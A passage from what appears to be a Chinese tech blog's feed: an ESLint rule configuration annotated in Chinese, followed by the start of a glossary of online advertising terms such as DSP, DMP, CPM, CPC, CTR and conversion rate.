class="comment">//禁止catch子句参数与外部作用域变量同名</span></span><br><span class="line"><span class="string">"no-class-assign"</span>: <span class="number">2</span>,<span class="comment">//禁止给类赋值</span></span><br><span class="line"><span class="string">"no-cond-assign"</span>: <span class="number">2</span>,<span class="comment">//禁止在条件表达式中使用赋值语句</span></span><br><span class="line"><span class="string">"no-console"</span>: <span class="number">2</span>,<span class="comment">//禁止使用console</span></span><br><span class="line"><span class="string">"no-const-assign"</span>: <span class="number">2</span>,<span class="comment">//禁止修改const声明的变量</span></span><br><span class="line"><span class="string">"no-constant-condition"</span>: <span class="number">2</span>,<span class="comment">//禁止在条件中使用常量表达式 if(true) if(1)</span></span><br><span class="line"><span class="string">"no-continue"</span>: <span class="number">0</span>,<span class="comment">//禁止使用continue</span></span><br><span class="line"><span class="string">"no-control-regex"</span>: <span class="number">2</span>,<span class="comment">//禁止在正则表达式中使用控制字符</span></span><br><span class="line"><span class="string">"no-debugger"</span>: <span class="number">2</span>,<span class="comment">//禁止使用debugger</span></span><br><span class="line"><span class="string">"no-delete-var"</span>: <span class="number">2</span>,<span class="comment">//不能对var声明的变量使用delete操作符</span></span><br><span class="line"><span class="string">"no-div-regex"</span>: <span class="number">1</span>,<span class="comment">//不能使用看起来像除法的正则表达式/=foo/</span></span><br><span class="line"><span class="string">"no-dupe-keys"</span>: <span class="number">2</span>,<span class="comment">//在创建对象字面量时不允许键重复 &#123;a:1,a:1&#125;</span></span><br><span class="line"><span class="string">"no-dupe-args"</span>: <span class="number">2</span>,<span class="comment">//函数参数不能重复</span></span><br><span class="line"><span class="string">"no-duplicate-case"</span>: <span class="number">2</span>,<span class="comment">//switch中的case标签不能重复</span></span><br><span class="line"><span class="string">"no-else-return"</span>: <span class="number">2</span>,<span class="comment">//如果if语句里面有return,后面不能跟else语句</span></span><br><span class="line"><span class="string">"no-empty"</span>: <span class="number">2</span>,<span class="comment">//块语句中的内容不能为空</span></span><br><span class="line"><span class="string">"no-empty-character-class"</span>: <span class="number">2</span>,<span class="comment">//正则表达式中的[]内容不能为空</span></span><br><span class="line"><span class="string">"no-empty-label"</span>: <span class="number">2</span>,<span class="comment">//禁止使用空label</span></span><br><span class="line"><span class="string">"no-eq-null"</span>: <span class="number">2</span>,<span class="comment">//禁止对null使用==或!=运算符</span></span><br><span class="line"><span class="string">"no-eval"</span>: <span class="number">1</span>,<span class="comment">//禁止使用eval</span></span><br><span class="line"><span class="string">"no-ex-assign"</span>: <span class="number">2</span>,<span class="comment">//禁止给catch语句中的异常参数赋值</span></span><br><span class="line"><span class="string">"no-extend-native"</span>: <span class="number">2</span>,<span class="comment">//禁止扩展native对象</span></span><br><span class="line"><span class="string">"no-extra-bind"</span>: <span class="number">2</span>,<span class="comment">//禁止不必要的函数绑定</span></span><br><span class="line"><span class="string">"no-extra-boolean-cast"</span>: <span class="number">2</span>,<span class="comment">//禁止不必要的bool转换</span></span><br><span class="line"><span class="string">"no-extra-parens"</span>: <span class="number">2</span>,<span class="comment">//禁止非必要的括号</span></span><br><span class="line"><span class="string">"no-extra-semi"</span>: <span class="number">2</span>,<span class="comment">//禁止多余的冒号</span></span><br><span class="line"><span class="string">"no-fallthrough"</span>: <span class="number">1</span>,<span class="comment">//禁止switch穿透</span></span><br><span class="line"><span class="string">"no-floating-decimal"</span>: <span class="number">2</span>,<span class="comment">//禁止省略浮点数中的0 .5 3.</span></span><br><span class="line"><span class="string">"no-func-assign"</span>: <span class="number">2</span>,<span class="comment">//禁止重复的函数声明</span></span><br><span class="line"><span class="string">"no-implicit-coercion"</span>: <span class="number">1</span>,<span class="comment">//禁止隐式转换</span></span><br><span class="line"><span class="string">"no-implied-eval"</span>: <span class="number">2</span>,<span class="comment">//禁止使用隐式eval</span></span><br><span class="line"><span class="string">"no-inline-comments"</span>: <span class="number">0</span>,<span class="comment">//禁止行内备注</span></span><br><span class="line"><span class="string">"no-inner-declarations"</span>: [<span class="number">2</span>, <span class="string">"functions"</span>],<span class="comment">//禁止在块语句中使用声明（变量或函数）</span></span><br><span class="line"><span class="string">"no-invalid-regexp"</span>: <span class="number">2</span>,<span class="comment">//禁止无效的正则表达式</span></span><br><span class="line"><span class="string">"no-invalid-this"</span>: <span class="number">2</span>,<span class="comment">//禁止无效的this，只能用在构造器，类，对象字面量</span></span><br><span class="line"><span class="string">"no-irregular-whitespace"</span>: <span class="number">2</span>,<span class="comment">//不能有不规则的空格</span></span><br><span class="line"><span class="string">"no-iterator"</span>: <span class="number">2</span>,<span class="comment">//禁止使用__iterator__ 属性</span></span><br><span class="line"><span class="string">"no-label-var"</span>: <span class="number">2</span>,<span class="comment">//label名不能与var声明的变量名相同</span></span><br><span class="line"><span class="string">"no-labels"</span>: <span class="number">2</span>,<span class="comment">//禁止标签声明</span></span><br><span class="line"><span class="string">"no-lone-blocks"</span>: <span class="number">2</span>,<span class="comment">//禁止不必要的嵌套块</span></span><br><span class="line"><span class="string">"no-lonely-if"</span>: <span class="number">2</span>,<span class="comment">//禁止else语句内只有if语句</span></span><br><span class="line"><span class="string">"no-loop-func"</span>: <span class="number">1</span>,<span class="comment">//禁止在循环中使用函数（如果没有引用外部变量不形成闭包就可以）</span></span><br><span class="line"><span class="string">"no-mixed-requires"</span>: [<span class="number">0</span>, <span class="literal">false</span>],<span class="comment">//声明时不能混用声明类型</span></span><br><span class="line"><span class="string">"no-mixed-spaces-and-tabs"</span>: [<span class="number">2</span>, <span class="literal">false</span>],<span class="comment">//禁止混用tab和空格</span></span><br><span class="line"><span class="string">"linebreak-style"</span>: [<span class="number">0</span>, <span class="string">"windows"</span>],<span class="comment">//换行风格</span></span><br><span class="line"><span class="string">"no-multi-spaces"</span>: <span class="number">1</span>,<span class="comment">//不能用多余的空格</span></span><br><span class="line"><span class="string">"no-multi-str"</span>: <span class="number">2</span>,<span class="comment">//字符串不能用\换行</span></span><br><span class="line"><span class="string">"no-multiple-empty-lines"</span>: [<span class="number">1</span>, &#123;<span class="string">"max"</span>: <span class="number">2</span>&#125;],<span class="comment">//空行最多不能超过2行</span></span><br><span class="line"><span class="string">"no-native-reassign"</span>: <span class="number">2</span>,<span class="comment">//不能重写native对象</span></span><br><span class="line"><span class="string">"no-negated-in-lhs"</span>: <span class="number">2</span>,<span class="comment">//in 操作符的左边不能有!</span></span><br><span class="line"><span class="string">"no-nested-ternary"</span>: <span class="number">0</span>,<span class="comment">//禁止使用嵌套的三目运算</span></span><br><span class="line"><span class="string">"no-new"</span>: <span class="number">1</span>,<span class="comment">//禁止在使用new构造一个实例后不赋值</span></span><br><span class="line"><span class="string">"no-new-func"</span>: <span class="number">1</span>,<span class="comment">//禁止使用new Function</span></span><br><span class="line"><span class="string">"no-new-object"</span>: <span class="number">2</span>,<span class="comment">//禁止使用new Object()</span></span><br><span class="line"><span class="string">"no-new-require"</span>: <span class="number">2</span>,<span class="comment">//禁止使用new require</span></span><br><span class="line"><span class="string">"no-new-wrappers"</span>: <span class="number">2</span>,<span class="comment">//禁止使用new创建包装实例，new String new Boolean new Number</span></span><br><span class="line"><span class="string">"no-obj-calls"</span>: <span class="number">2</span>,<span class="comment">//不能调用内置的全局对象，比如Math() JSON()</span></span><br><span class="line"><span class="string">"no-octal"</span>: <span class="number">2</span>,<span class="comment">//禁止使用八进制数字</span></span><br><span class="line"><span class="string">"no-octal-escape"</span>: <span class="number">2</span>,<span class="comment">//禁止使用八进制转义序列</span></span><br><span class="line"><span class="string">"no-param-reassign"</span>: <span class="number">2</span>,<span class="comment">//禁止给参数重新赋值</span></span><br><span class="line"><span class="string">"no-path-concat"</span>: <span class="number">0</span>,<span class="comment">//node中不能使用__dirname或__filename做路径拼接</span></span><br><span class="line"><span class="string">"no-plusplus"</span>: <span class="number">0</span>,<span class="comment">//禁止使用++，--</span></span><br><span class="line"><span class="string">"no-process-env"</span>: <span class="number">0</span>,<span class="comment">//禁止使用process.env</span></span><br><span class="line"><span class="string">"no-process-exit"</span>: <span class="number">0</span>,<span class="comment">//禁止使用process.exit()</span></span><br><span class="line"><span class="string">"no-proto"</span>: <span class="number">2</span>,<span class="comment">//禁止使用__proto__属性</span></span><br><span class="line"><span class="string">"no-redeclare"</span>: <span class="number">2</span>,<span class="comment">//禁止重复声明变量</span></span><br><span class="line"><span class="string">"no-regex-spaces"</span>: <span class="number">2</span>,<span class="comment">//禁止在正则表达式字面量中使用多个空格 /foo bar/</span></span><br><span class="line"><span class="string">"no-restricted-modules"</span>: <span class="number">0</span>,<span class="comment">//如果禁用了指定模块，使用就会报错</span></span><br><span class="line"><span class="string">"no-return-assign"</span>: <span class="number">1</span>,<span class="comment">//return 语句中不能有赋值表达式</span></span><br><span class="line"><span class="string">"no-script-url"</span>: <span class="number">0</span>,<span class="comment">//禁止使用javascript:void(0)</span></span><br><span class="line"><span class="string">"no-self-compare"</span>: <span class="number">2</span>,<span class="comment">//不能比较自身</span></span><br><span class="line"><span class="string">"no-sequences"</span>: <span class="number">0</span>,<span class="comment">//禁止使用逗号运算符</span></span><br><span class="line"><span class="string">"no-shadow"</span>: <span class="number">2</span>,<span class="comment">//外部作用域中的变量不能与它所包含的作用域中的变量或参数同名</span></span><br><span class="line"><span class="string">"no-shadow-restricted-names"</span>: <span class="number">2</span>,<span class="comment">//严格模式中规定的限制标识符不能作为声明时的变量名使用</span></span><br><span class="line"><span class="string">"no-spaced-func"</span>: <span class="number">2</span>,<span class="comment">//函数调用时 函数名与()之间不能有空格</span></span><br><span class="line"><span class="string">"no-sparse-arrays"</span>: <span class="number">2</span>,<span class="comment">//禁止稀疏数组， [1,,2]</span></span><br><span class="line"><span class="string">"no-sync"</span>: <span class="number">0</span>,<span class="comment">//nodejs 禁止同步方法</span></span><br><span class="line"><span class="string">"no-ternary"</span>: <span class="number">0</span>,<span class="comment">//禁止使用三目运算符</span></span><br><span class="line"><span class="string">"no-trailing-spaces"</span>: <span class="number">1</span>,<span class="comment">//一行结束后面不要有空格</span></span><br><span class="line"><span class="string">"no-this-before-super"</span>: <span class="number">0</span>,<span class="comment">//在调用super()之前不能使用this或super</span></span><br><span class="line"><span class="string">"no-throw-literal"</span>: <span class="number">2</span>,<span class="comment">//禁止抛出字面量错误 throw "error";</span></span><br><span class="line"><span class="string">"no-undef"</span>: <span class="number">1</span>,<span class="comment">//不能有未定义的变量</span></span><br><span class="line"><span class="string">"no-undef-init"</span>: <span class="number">2</span>,<span class="comment">//变量初始化时不能直接给它赋值为undefined</span></span><br><span class="line"><span class="string">"no-undefined"</span>: <span class="number">2</span>,<span class="comment">//不能使用undefined</span></span><br><span class="line"><span class="string">"no-unexpected-multiline"</span>: <span class="number">2</span>,<span class="comment">//避免多行表达式</span></span><br><span class="line"><span class="string">"no-underscore-dangle"</span>: <span class="number">1</span>,<span class="comment">//标识符不能以_开头或结尾</span></span><br><span class="line"><span class="string">"no-unneeded-ternary"</span>: <span class="number">2</span>,<span class="comment">//禁止不必要的嵌套 var isYes = answer === 1 ? true : false;</span></span><br><span class="line"><span class="string">"no-unreachable"</span>: <span class="number">2</span>,<span class="comment">//不能有无法执行的代码</span></span><br><span class="line"><span class="string">"no-unused-expressions"</span>: <span class="number">2</span>,<span class="comment">//禁止无用的表达式</span></span><br><span class="line"><span class="string">"no-unused-vars"</span>: [<span class="number">2</span>, &#123;<span class="string">"vars"</span>: <span class="string">"all"</span>, <span class="string">"args"</span>: <span class="string">"after-used"</span>&#125;],<span class="comment">//不能有声明后未被使用的变量或参数</span></span><br><span class="line"><span class="string">"no-use-before-define"</span>: <span class="number">2</span>,<span class="comment">//未定义前不能使用</span></span><br><span class="line"><span class="string">"no-useless-call"</span>: <span class="number">2</span>,<span class="comment">//禁止不必要的call和apply</span></span><br><span class="line"><span class="string">"no-void"</span>: <span class="number">2</span>,<span class="comment">//禁用void操作符</span></span><br><span class="line"><span class="string">"no-var"</span>: <span class="number">0</span>,<span class="comment">//禁用var，用let和const代替</span></span><br><span class="line"><span class="string">"no-warning-comments"</span>: [<span class="number">1</span>, &#123; <span class="string">"terms"</span>: [<span class="string">"todo"</span>, <span class="string">"fixme"</span>, <span class="string">"xxx"</span>], <span class="string">"location"</span>: <span class="string">"start"</span> &#125;],<span class="comment">//不能有警告备注</span></span><br><span class="line"><span class="string">"no-with"</span>: <span class="number">2</span>,<span class="comment">//禁用with</span></span><br><span class="line"></span><br><span class="line"><span class="string">"array-bracket-spacing"</span>: [<span class="number">2</span>, <span class="string">"never"</span>],<span class="comment">//是否允许非空数组里面有多余的空格</span></span><br><span class="line"><span class="string">"arrow-parens"</span>: <span class="number">0</span>,<span class="comment">//箭头函数用小括号括起来</span></span><br><span class="line"><span class="string">"arrow-spacing"</span>: <span class="number">0</span>,<span class="comment">//=&gt;的前/后括号</span></span><br><span class="line"><span class="string">"accessor-pairs"</span>: <span class="number">0</span>,<span class="comment">//在对象中使用getter/setter</span></span><br><span class="line"><span class="string">"block-scoped-var"</span>: <span class="number">0</span>,<span class="comment">//块语句中使用var</span></span><br><span class="line"><span class="string">"brace-style"</span>: [<span class="number">1</span>, <span class="string">"1tbs"</span>],<span class="comment">//大括号风格</span></span><br><span class="line"><span class="string">"callback-return"</span>: <span class="number">1</span>,<span class="comment">//避免多次调用回调什么的</span></span><br><span class="line"><span class="string">"camelcase"</span>: <span class="number">2</span>,<span class="comment">//强制驼峰法命名</span></span><br><span class="line"><span class="string">"comma-dangle"</span>: [<span class="number">2</span>, <span class="string">"never"</span>],<span class="comment">//对象字面量项尾不能有逗号</span></span><br><span class="line"><span class="string">"comma-spacing"</span>: <span class="number">0</span>,<span class="comment">//逗号前后的空格</span></span><br><span class="line"><span class="string">"comma-style"</span>: [<span class="number">2</span>, <span class="string">"last"</span>],<span class="comment">//逗号风格，换行时在行首还是行尾</span></span><br><span class="line"><span class="string">"complexity"</span>: [<span class="number">0</span>, <span class="number">11</span>],<span class="comment">//循环复杂度</span></span><br><span class="line"><span class="string">"computed-property-spacing"</span>: [<span class="number">0</span>, <span class="string">"never"</span>],<span class="comment">//是否允许计算后的键名什么的</span></span><br><span class="line"><span class="string">"consistent-return"</span>: <span class="number">0</span>,<span class="comment">//return 后面是否允许省略</span></span><br><span class="line"><span class="string">"consistent-this"</span>: [<span class="number">2</span>, <span class="string">"that"</span>],<span class="comment">//this别名</span></span><br><span class="line"><span class="string">"constructor-super"</span>: <span class="number">0</span>,<span class="comment">//非派生类不能调用super，派生类必须调用super</span></span><br><span class="line"><span class="string">"curly"</span>: [<span class="number">2</span>, <span class="string">"all"</span>],<span class="comment">//必须使用 if()&#123;&#125; 中的&#123;&#125;</span></span><br><span class="line"><span class="string">"default-case"</span>: <span class="number">2</span>,<span class="comment">//switch语句最后必须有default</span></span><br><span class="line"><span class="string">"dot-location"</span>: <span class="number">0</span>,<span class="comment">//对象访问符的位置，换行的时候在行首还是行尾</span></span><br><span class="line"><span class="string">"dot-notation"</span>: [<span class="number">0</span>, &#123; <span class="string">"allowKeywords"</span>: <span class="literal">true</span> &#125;],<span class="comment">//避免不必要的方括号</span></span><br><span class="line"><span class="string">"eol-last"</span>: <span class="number">0</span>,<span class="comment">//文件以单一的换行符结束</span></span><br><span class="line"><span class="string">"eqeqeq"</span>: <span class="number">2</span>,<span class="comment">//必须使用全等</span></span><br><span class="line"><span class="string">"func-names"</span>: <span class="number">0</span>,<span class="comment">//函数表达式必须有名字</span></span><br><span class="line"><span class="string">"func-style"</span>: [<span class="number">0</span>, <span class="string">"declaration"</span>],<span class="comment">//函数风格，规定只能使用函数声明/函数表达式</span></span><br><span class="line"><span class="string">"generator-star-spacing"</span>: <span class="number">0</span>,<span class="comment">//生成器函数*的前后空格</span></span><br><span class="line"><span class="string">"guard-for-in"</span>: <span class="number">0</span>,<span class="comment">//for in循环要用if语句过滤</span></span><br><span class="line"><span class="string">"handle-callback-err"</span>: <span class="number">0</span>,<span class="comment">//nodejs 处理错误</span></span><br><span class="line"><span class="string">"id-length"</span>: <span class="number">0</span>,<span class="comment">//变量名长度</span></span><br><span class="line"><span class="string">"indent"</span>: [<span class="number">2</span>, <span class="number">4</span>],<span class="comment">//缩进风格</span></span><br><span class="line"><span class="string">"init-declarations"</span>: <span class="number">0</span>,<span class="comment">//声明时必须赋初值</span></span><br><span class="line"><span class="string">"key-spacing"</span>: [<span class="number">0</span>, &#123; <span class="string">"beforeColon"</span>: <span class="literal">false</span>, <span class="string">"afterColon"</span>: <span class="literal">true</span> &#125;],<span class="comment">//对象字面量中冒号的前后空格</span></span><br><span class="line"><span class="string">"lines-around-comment"</span>: <span class="number">0</span>,<span class="comment">//行前/行后备注</span></span><br><span class="line"><span class="string">"max-depth"</span>: [<span class="number">0</span>, <span class="number">4</span>],<span class="comment">//嵌套块深度</span></span><br><span class="line"><span class="string">"max-len"</span>: [<span class="number">0</span>, <span class="number">80</span>, <span class="number">4</span>],<span class="comment">//字符串最大长度</span></span><br><span class="line"><span class="string">"max-nested-callbacks"</span>: [<span class="number">0</span>, <span class="number">2</span>],<span class="comment">//回调嵌套深度</span></span><br><span class="line"><span class="string">"max-params"</span>: [<span class="number">0</span>, <span class="number">3</span>],<span class="comment">//函数最多只能有3个参数</span></span><br><span class="line"><span class="string">"max-statements"</span>: [<span class="number">0</span>, <span class="number">10</span>],<span class="comment">//函数内最多有几个声明</span></span><br><span class="line"><span class="string">"new-cap"</span>: <span class="number">2</span>,<span class="comment">//函数名首行大写必须使用new方式调用，首行小写必须用不带new方式调用</span></span><br><span class="line"><span class="string">"new-parens"</span>: <span class="number">2</span>,<span class="comment">//new时必须加小括号</span></span><br><span class="line"><span class="string">"newline-after-var"</span>: <span class="number">2</span>,<span class="comment">//变量声明后是否需要空一行</span></span><br><span class="line"><span class="string">"object-curly-spacing"</span>: [<span class="number">0</span>, <span class="string">"never"</span>],<span class="comment">//大括号内是否允许不必要的空格</span></span><br><span class="line"><span class="string">"object-shorthand"</span>: <span class="number">0</span>,<span class="comment">//强制对象字面量缩写语法</span></span><br><span class="line"><span class="string">"one-var"</span>: <span class="number">1</span>,<span class="comment">//连续声明</span></span><br><span class="line"><span class="string">"operator-assignment"</span>: [<span class="number">0</span>, <span class="string">"always"</span>],<span class="comment">//赋值运算符 += -=什么的</span></span><br><span class="line"><span class="string">"operator-linebreak"</span>: [<span class="number">2</span>, <span class="string">"after"</span>],<span class="comment">//换行时运算符在行尾还是行首</span></span><br><span class="line"><span class="string">"padded-blocks"</span>: <span class="number">0</span>,<span class="comment">//块语句内行首行尾是否要空行</span></span><br><span class="line"><span class="string">"prefer-const"</span>: <span class="number">0</span>,<span class="comment">//首选const</span></span><br><span class="line"><span class="string">"prefer-spread"</span>: <span class="number">0</span>,<span class="comment">//首选展开运算</span></span><br><span class="line"><span class="string">"prefer-reflect"</span>: <span class="number">0</span>,<span class="comment">//首选Reflect的方法</span></span><br><span class="line"><span class="string">"quotes"</span>: [<span class="number">1</span>, <span class="string">"single"</span>],<span class="comment">//引号类型 `` "" ''</span></span><br><span class="line"><span class="string">"quote-props"</span>:[<span class="number">2</span>, <span class="string">"always"</span>],<span class="comment">//对象字面量中的属性名是否强制双引号</span></span><br><span class="line"><span class="string">"radix"</span>: <span class="number">2</span>,<span class="comment">//parseInt必须指定第二个参数</span></span><br><span class="line"><span class="string">"id-match"</span>: <span class="number">0</span>,<span class="comment">//命名检测</span></span><br><span class="line"><span class="string">"require-yield"</span>: <span class="number">0</span>,<span class="comment">//生成器函数必须有yield</span></span><br><span class="line"><span class="string">"semi"</span>: [<span class="number">2</span>, <span class="string">"always"</span>],<span class="comment">//语句强制分号结尾</span></span><br><span class="line"><span class="string">"semi-spacing"</span>: [<span class="number">0</span>, &#123;<span class="string">"before"</span>: <span class="literal">false</span>, <span class="string">"after"</span>: <span class="literal">true</span>&#125;],<span class="comment">//分号前后空格</span></span><br><span class="line"><span class="string">"sort-vars"</span>: <span class="number">0</span>,<span class="comment">//变量声明时排序</span></span><br><span class="line"><span class="string">"space-after-keywords"</span>: [<span class="number">0</span>, <span class="string">"always"</span>],<span class="comment">//关键字后面是否要空一格</span></span><br><span class="line"><span class="string">"space-before-blocks"</span>: [<span class="number">0</span>, <span class="string">"always"</span>],<span class="comment">//不以新行开始的块&#123;前面要不要有空格</span></span><br><span class="line"><span class="string">"space-before-function-paren"</span>: [<span class="number">0</span>, <span class="string">"always"</span>],<span class="comment">//函数定义时括号前面要不要有空格</span></span><br><span class="line"><span class="string">"space-in-parens"</span>: [<span class="number">0</span>, <span class="string">"never"</span>],<span class="comment">//小括号里面要不要有空格</span></span><br><span class="line"><span class="string">"space-infix-ops"</span>: <span class="number">0</span>,<span class="comment">//中缀操作符周围要不要有空格</span></span><br><span class="line"><span class="string">"space-return-throw-case"</span>: <span class="number">2</span>,<span class="comment">//return throw case后面要不要加空格</span></span><br><span class="line"><span class="string">"space-unary-ops"</span>: [<span class="number">0</span>, &#123; <span class="string">"words"</span>: <span class="literal">true</span>, <span class="string">"nonwords"</span>: <span class="literal">false</span> &#125;],<span class="comment">//一元运算符的前/后要不要加空格</span></span><br><span class="line"><span class="string">"spaced-comment"</span>: <span class="number">0</span>,<span class="comment">//注释风格要不要有空格什么的</span></span><br><span class="line"><span class="string">"strict"</span>: <span class="number">2</span>,<span class="comment">//使用严格模式</span></span><br><span class="line"><span class="string">"use-isnan"</span>: <span class="number">2</span>,<span class="comment">//禁止比较时使用NaN，只能用isNaN()</span></span><br><span class="line"><span class="string">"valid-jsdoc"</span>: <span class="number">0</span>,<span class="comment">//jsdoc规则</span></span><br><span class="line"><span class="string">"valid-typeof"</span>: <span class="number">2</span>,<span class="comment">//必须使用合法的typeof的值</span></span><br><span class="line"><span class="string">"vars-on-top"</span>: <span class="number">2</span>,<span class="comment">//var必须放在作用域顶部</span></span><br><span class="line"><span class="string">"wrap-iife"</span>: [<span class="number">2</span>, <span class="string">"inside"</span>],<span class="comment">//立即执行函数表达式的小括号风格</span></span><br><span class="line"><span class="string">"wrap-regex"</span>: <span class="number">0</span>,<span class="comment">//正则表达式字面量用小括号包起来</span></span><br><span class="line"><span class="string">"yoda"</span>: [<span class="number">2</span>, <span class="string">"never"</span>]<span class="comment">//禁止尤达条件</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span 
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="规范" scheme="http://blog.poetries.top/tags/%E8%A7%84%E8%8C%83/"/>
    
      <category term="eslint" scheme="http://blog.poetries.top/tags/eslint/"/>
    
  </entry>
  
  <entry>
    <title>广告行业一些术语</title>
    <link href="http://blog.poetries.top/2018/01/27/ad-term/"/>
    <id>http://blog.poetries.top/2018/01/27/ad-term/</id>
    <published>2018-01-27T14:21:24.000Z</published>
    <updated>2018-04-10T03:33:13.971Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、平台"><a href="#一、平台" class="headerlink" title="一、平台"></a>一、平台</h2><p><strong>DSP</strong></p><blockquote><p><code>DSP</code>广告简单来说主要涉及：广告主，媒体，访客</p></blockquote><ul><li><code>DSP</code>广告对接多个<code>Ad Exchange</code>，<code>Ad Exchange</code>中有大量的媒体广告位</li></ul><p><strong>DMP</strong></p><blockquote><p>Data-ManagementPlatform，数据管理平台</p></blockquote><ul><li><p>定义：数据管理平台能够帮助所有涉及广告库存购买和出售的各方管理其数据、更方便地使用第三方数据、增强他们对所有这些数据的理解、传回数据或将定制数据传入某一平台，以进行更好地定位</p></li><li><p>是把分散的数据进行整合纳入统一的技术平台</p></li></ul><h2 id="二、专业术语"><a href="#二、专业术语" class="headerlink" title="二、专业术语"></a>二、专业术语</h2><p><strong>信息流广告</strong></p><ul><li><p>信息流广告是目前移动APP上常见的广告形式之一</p><ul><li>简述特点如下<ul><li>出现位置：穿插在产品原有内容信息当中出现（包括当下社交平台的feeds，资讯新闻类产品的文章列表）</li><li>展现形式：常见的有文字图片加链接形式，现也有以视频流的形式播放出现</li><li>投放特点：基于用户行为以及平台上积累的大数据，精准投放；（包括用户在平台上的浏览、评论、分享等各种互动行为，了解用户偏好，匹配相关度高的广告）</li><li>收费形式：CPM（按展示次数收费）和CPC（按点击次数收费）为主</li></ul></li></ul></li><li><p>优点</p><ul><li>与原有内容融合在一起出现，在用户视觉焦点中，不容易被忽视</li><li>精准投放，转化率高</li><li>对用户的打扰性低</li><li>可以通过让用户参与互动（评论、分享、投票）等形式提升广告效果</li></ul></li></ul><h3 id="2-1-行业相关"><a href="#2-1-行业相关" class="headerlink" title="2.1 行业相关"></a>2.1 行业相关</h3><ul><li><strong>Rich Media 富媒体</strong>，这种应用采取了所有适合的最先进技术，以最好的传达广告主的信息，甚至与用户进行互动，如视频、flash广告等</li><li><strong>植入式广告</strong> 在电影或电视剧或者其它综艺节目插入相关的广告，如变形金刚，非诚勿扰等</li><li><strong>SEM</strong>：Search EngineMarketing的缩写，即搜索引擎营销</li><li><strong>SEO</strong>：SearchEngineOptimization的缩写，即搜索引擎优化</li><li><strong>EDM</strong>：Electronic Direct Marketing的缩写，就是电子邮件营销</li><li><strong>AdWords</strong>：Google的关键词竞价广告</li><li><strong>Banner</strong>：横幅广告</li><li><strong>Button</strong>：图标广告</li><li><strong>PR推广</strong>：软文推广</li><li><strong>Adertorial</strong>：软文广告的一种，即付费文章，故意设计成像一篇普通的文章</li><li><strong>Banner Ad</strong>：横幅广告，网页顶部、底部或者侧边的广告展示位置</li><li><strong>DSP展示广告</strong>：是<code>Demand-SidePlatform</code>的缩写，即需求方平台</li></ul><h3 id="2-2-计费相关"><a href="#2-2-计费相关" class="headerlink" title="2.2 计费相关"></a>2.2 计费相关</h3><ul><li><strong>CPS</strong>：<code>Cost Per Sales</code>的缩写，即销售分成</li><li><strong>CPA</strong>：<code>Cost Per Action</code>，每次动作成本</li><li><strong>CPM</strong>：<code>Cost Per Mille</code>，或者<code>Cost Per Thousand</code>，即每千人成本</li><li><strong>CPC</strong>：<code>Cost Per Click</code>，<code>Cost Per Thousand Click-Through</code>，即每点击成本</li><li><strong>CPR</strong>：<code>Cost Per Response</code>，即每回应成本</li><li><strong>CPP</strong>：<code>Cost Per Purchase</code>，即每购买成本</li><li><strong>UV</strong>：<code>Unique Vister</code>的缩写，独立访客</li><li><strong>PV</strong>：<code>page view</code>，即网站被浏览的总次数</li><li><strong>IP</strong>：即<code>internet protocol</code>,指独立<code>IP</code>数，一天内相同IP地址只被计算一次</li><li><strong>PR值</strong>：全称为<code>Pagerank</code>(网页级别)，是用于评测一个网页“重要性”的一种方法</li><li><strong>Alexa</strong>：<code>Alexa.com</code>是专门发布网站世界排名的网站，网站排名有两种：综合排名和分类排名</li><li><strong>Click</strong>：(点击量/点击次数)即<code>Click through</code>，用户点击广告的次数，评估广告效果的指标之一</li><li><strong>Click Rate</strong>：(点击率/点进率)即<code>Clickthrough-Rate</code>，即网络广告被点击的次数与访问次数的比例，即<code>clicks/impressions</code>.如果这个页面被访问了100次，而页面上的广告也被点击了20次，那么CTR为20%，CTR是评估广告效果的指标之一</li></ul><h3 id="2-3-转化相关"><a href="#2-3-转化相关" class="headerlink" title="2.3 转化相关"></a>2.3 转化相关</h3><ul><li><p><strong>ROI</strong> <code>Return OnInvestment</code>的缩写，投资报酬率</p></li><li><p><strong>CR转化率</strong> <code>Conversion Rate</code>的缩写，是指访问某一网站访客中，转化的访客占全部访客的比例</p></li><li><p><strong>二跳率</strong> 网站页面展开后，用户在页面上产生的首次点击被称为“二跳”，二跳的次数即为”二跳量”，二跳量与浏览量的比值称为页面的二跳率</p></li><li><p><strong>跳出率</strong> 跳出率是指浏览了一个页面就离开的用户占一组页面或一个页面访问次数的百分比</p></li><li><p><strong>人均访问页面</strong> <code>PV总和除以IP=人均访问页面</code>。人均访问页面<code>大于等于10</code>个，才算优质用户</p></li><li><p><strong>重复购买率</strong> 指消费者在网站中的重复购买次数</p></li><li><p><strong>客单价</strong> 是指每一个订单的平均购买商品金额，也就是平均交易金额</p></li></ul><h3 id="2-4-理论"><a href="#2-4-理论" class="headerlink" title="2.4 理论"></a>2.4 理论</h3><p><strong>马太效应：（Matthew Effect）</strong> 